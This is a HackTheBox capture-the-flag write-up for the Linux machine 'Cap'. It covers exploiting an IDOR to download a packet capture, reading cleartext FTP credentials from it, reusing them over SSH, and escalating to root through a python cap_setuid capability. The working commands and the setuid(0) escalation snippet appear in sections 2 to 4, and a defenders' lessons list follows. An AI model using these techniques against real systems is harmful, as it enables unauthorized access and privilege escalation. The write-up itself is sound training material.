# [Cap](https://app.hackthebox.com/machines/Cap) - HackTheBox Machines Writeup

```
Box       : Cap
OS        : Linux
Difficulty: Easy
Target    : 10.129.119.127
Attacker  : 10.10.15.82
```

---

## Attack Path Overview

```
IDOR on Web Dashboard  >  PCAP Download (ID=0)
        v
FTP Credentials in Cleartext  >  SSH Login as nathan
        v
Python cap_setuid Capability  >  root
```

Two vulnerabilities, neither complex. The IDOR hands you credentials. The misconfigured Linux capability hands you root. A textbook case of how small mistakes compound.

---

## 1. Reconnaissance

```bash
$ nmap -p- -T4 10.129.119.127

PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

Here we can see:

- **FTP (21)**: an older protocol that transmits data, including credentials, in **plaintext**.
- **SSH (22)**: the standard remote administration port on Linux. Any credentials found elsewhere are worth testing here: password reuse is extremely common.
- **HTTP (80)**: a web application. The primary attack surface to investigate first.

## 2. Web Enumeration

### 2.1 The Security Dashboard

Visiting `http://10.129.119.127` reveals a network security dashboard. One feature stands out: **Security Snapshots**, which captures 5 seconds of live network traffic and saves it as a PCAP file.

Each snapshot is accessible at:
```
http://10.129.119.127/data/<id>
```

Where `<id>` is a sequential integer assigned when the snapshot is created.

### 2.2 Insecure Direct Object Reference (IDOR)

This is an **IDOR vulnerability**. The application uses a predictable, user-controlled identifier to access a resource, without verifying whether the requesting user is authorised to access *that specific* resource.

Concretely: when you generate a snapshot, you might receive ID `4`. But nothing stops you from requesting ID `0`, `1`, or `2`.

```bash
$ curl http://10.129.119.127/data/0 --output capture0.pcap
```

### 2.3 Analysing the PCAP

Opening `capture0.pcap` in Wireshark reveals a **complete FTP session** with credentials transmitted in cleartext:

```
Frame 36   192.168.196.1 > 192.168.196.16   FTP   Request: USER nathan
Frame 40   192.168.196.1 > 192.168.196.16   FTP   Request: PASS Buck3tH4TF0RM3!
Frame 42   192.168.196.16 > 192.168.196.1   FTP   Response: 230 Login successful.
```

FTP was designed in the 1970s, before encrypted communications were standard. This is why FTP has been superseded by SFTP and FTPS in modern environments.

**Credentials found:** `nathan : Buck3tH4TF0RM3!`

## 3. Initial Access - SSH

With credentials in hand, the next step is to test them against every available service. The open SSH port (22) is the obvious target.

```bash
$ ssh nathan@10.129.119.127
# Password: Buck3tH4TF0RM3!
```

Login succeeds. This is **credential reuse**: nathan used the same password for FTP and SSH.

**User flag:**
```bash
$ cat /home/nathan/user.txt
```

## 4. Privilege Escalation - Linux Capabilities

### 4.1 Enumeration with LinPEAS

Upload and run LinPEAS to automate the search for privilege escalation vectors:

```bash
# On Kali: download LinPEAS
$ wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh

# Transfer to target
$ scp linpeas.sh nathan@10.129.119.127:~/

# On target: execute
$ sh linpeas.sh
```

LinPEAS flags **an unusual Linux capability on Python 3.8**:

```
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

### 4.2 Understanding Linux Capabilities

Traditional Unix systems use a binary privilege model: a process is either running as root (UID 0) or it is not. **Linux Capabilities** break root's privileges into discrete units that can be granted individually to specific binaries.

The two capabilities set on `python3.8` here are:

| Capability | Purpose |
|---|---|
| `cap_setuid` | Allows the process to **arbitrarily change its own UID**, including to UID 0 (root) |
| `cap_net_bind_service` | Allows binding to ports below 1024 without root |

The `+eip` suffix means these capabilities are set as **Effective, Inheritable, and Permitted**, i.e. they are active immediately when the binary is executed.

The web application at `/var/www/html/app.py` uses `tcpdump` to capture network traffic for the Security Snapshots feature. Packet capture normally requires root or the `cap_net_raw` capability. The administrator granted these capabilities to Python so the web app could run packet captures.

The intention was to grant *limited* privilege. The mistake was granting `cap_setuid` alongside it.

### 4.3 Exploitation

`cap_setuid` allows a process to call `setuid(0)`, changing its effective user ID to root.

```bash
nathan@cap:~$ python3.8
```

```python
>>> import os
>>> os.setuid(0)    # change UID to root
>>> os.system("/bin/bash")

root@cap:~# cat /root/root.txt
```

## Lessons Learned

**For defenders:**

- **Never use FTP for authenticated sessions.** Use SFTP. FTP credentials are readable by any network observer.
- **IDOR requires authorisation checks on every request.** The web app should verify that the requesting user owns the snapshot ID being accessed.
- **Separate passwords for separate services.** Credential reuse reduces the security of all services to the level of the least secure one.
- **Understand what each Linux capability grants.** `cap_setuid` effectively equivalent to unrestricted root access, because it allows calling `setuid(0)`.

**What I learned**

- **LinPEAS** is a good tool to quickly surface privilege escalation vectors.

**Tools I used**

- nmap
- LinPEAS
- Wireshark
